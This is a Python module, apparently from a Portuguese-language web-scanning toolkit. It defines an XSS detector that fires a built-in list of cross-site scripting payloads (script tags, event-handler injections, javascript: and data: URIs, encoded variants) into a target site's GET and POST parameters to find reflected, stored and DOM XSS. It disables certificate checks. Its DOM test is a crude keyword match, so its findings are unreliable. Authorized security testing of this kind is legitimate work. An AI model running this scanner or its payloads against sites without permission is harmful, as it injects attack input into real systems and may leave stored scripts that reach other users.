# modules/web/xss.py
import requests
from urllib.parse import quote, urljoin
import re
from concurrent.futures import ThreadPoolExecutor

class XSSDetector:
    def __init__(self):
        self.payloads = self.load_xss_payloads()
        self.techniques = ['reflected', 'stored', 'dom']
        
    def load_xss_payloads(self):
        """Carrega payloads XSS de arquivo ou usa padrão"""
        try:
            with open('wordlists/payloads/xss.txt', 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            # Payloads padrão se arquivo não existir
            return [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                'javascript:alert("XSS")',
                '<body onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')">',
                '<input onfocus=alert("XSS") autofocus>',
                '<details ontoggle=alert("XSS")>',
                '<select onfocus=alert("XSS")>',
                '<video><source onerror=alert("XSS")>',
                '<audio src=x onerror=alert("XSS")>',
                '<form><button formaction=javascript:alert("XSS")>X</button>',
                '<math><mi//xlink:href="data:x,<script>alert("XSS")</script>">',
                '<marquee onstart=alert("XSS")>',
                '<div onpointerenter=alert("XSS")>XSS</div>',
                '"><script>alert("XSS")</script>',
                "'><script>alert('XSS')</script>",
                '"><img src=x onerror=alert("XSS")>',
                'javascript:alert("XSS");',
                'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
                'javascripT:alert("XSS")',
                'java%0ascript:alert("XSS")',
                '&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x22;&#x58;&#x53;&#x53;&#x22;&#x29;'
            ]

    def test_reflected_xss(self, url, param, value):
        """Testa XSS refletido"""
        test_url = f"{url}?{param}={quote(value)}"
        try:
            response = requests.get(test_url, timeout=8, verify=False)
            if value in response.text and 'alert(' in response.text.lower():
                return True
        except:
            pass
        return False

    def test_dom_xss(self, url, param, value):
        """Testa XSS baseado em DOM"""
        # Simula verificação básica de DOM XSS
        test_url = f"{url}?{param}={quote(value)}"
        try:
            response = requests.get(test_url, timeout=8, verify=False)
            # Verifica se há scripts suspeitos no response
            if any(indicator in response.text.lower() for indicator in 
                  ['document.write', 'innerhtml', 'eval(', 'settimeout', 'location.hash']):
                if value in response.text:
                    return True
        except:
            pass
        return False

    def test_stored_xss(self, url, form_data):
        """Testa XSS armazenado (necessita de formulário)"""
        try:
            response = requests.post(url, data=form_data, timeout=10, verify=False)
            # Verifica se o payload aparece em alguma página
            check_response = requests.get(url, timeout=8, verify=False)
            if any(payload in check_response.text for payload in self.payloads):
                return True
        except:
            pass
        return False

    def scan_xss(self, url, params=None):
        """Scan completo de XSS"""
        print(f"[+] Testando XSS em: {url}")
        
        vulnerabilities = []
        
        # Testa parâmetros GET
        if '?' in url:
            base_url, query_string = url.split('?', 1)
            query_params = dict(param.split('=') for param in query_string.split('&') if '=' in param)
            
            for param, original_value in query_params.items():
                for payload in self.payloads:
                    if self.test_reflected_xss(base_url, param, payload):
                        vulnerabilities.append(f"Reflected XSS em {param}: {payload}")
                    if self.test_dom_xss(base_url, param, payload):
                        vulnerabilities.append(f"DOM XSS em {param}: {payload}")
        
        # Testa parâmetros POST se fornecidos
        if params:
            for param, original_value in params.items():
                for payload in self.payloads:
                    form_data = {param: payload}
                    if self.test_stored_xss(url, form_data):
                        vulnerabilities.append(f"Stored XSS em {param}: {payload}")
        
        return vulnerabilities